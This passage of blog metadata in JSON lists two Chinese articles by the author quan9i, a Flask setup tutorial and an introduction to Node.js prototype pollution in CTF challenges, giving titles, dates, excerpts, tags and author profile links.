part-01","date":"2023-03-13T13:20:20.000Z","updated":"2023-04-20T16:32:06.000Z","comments":true,"path":"api/articles/Flask从0到0.1 part-01.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140018924.jpeg","text":"Flask环境搭建 Pycharm+Flask，具体流程如下，打开Pycharm 记得选下面这个Previously configured interpreter选项，上面那个是新建环境，而这个是自己C盘的环境，上面那个容易出现报错。 然后接下来可以发现有两个文件夹+一个文件，a...","link":"","photos":[],"count_time":{"symbolsCount":"11k","symbolsTime":"10 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"FLask","slug":"FLask","count":3,"path":"api/tags/FLask.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true},"next_post":{"title":"浅析CTF中的Node.js原型链污染","uid":"13607f594fc71a1c9cef23b62fe9395c","slug":"浅析CTF中的Node.js原型链污染","date":"2023-02-18T16:14:20.000Z","updated":"2023-04-07T16:54:46.000Z","comments":true,"path":"api/articles/浅析CTF中的Node.js原型链污染.json","keywords":null,"cover":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202304080051519.webp","text":"声明文章首发于Freebuf社区https://www.freebuf.com/articles/web/361333.html 前言Node.js之前并未有太多了解，最近遇上了一些相关题目，发现原型链污染是其一个常考点，在学习后对其进行了简单总结，希望对正在学习的师傅有所帮助 ...","link":"","photos":[],"count_time":{"symbolsCount":"19k","symbolsTime":"17 mins."},"categories":[{"name":"WEB知识","slug":"WEB知识","count":23,"path":"api/categories/WEB知识.json"}],"tags":[{"name":"Node.js","slug":"Node-js","count":1,"path":"api/tags/Node-js.json"}],"author":{"name":"quan9i","slug":"blog-author","avatar":"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303140010598.jpeg","link":"/","description":"国家一级保护废物","socials":{"github":"https://github.com/quan9i","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/Reme_mber","juejin":"","customs":{}}},"feature":true}}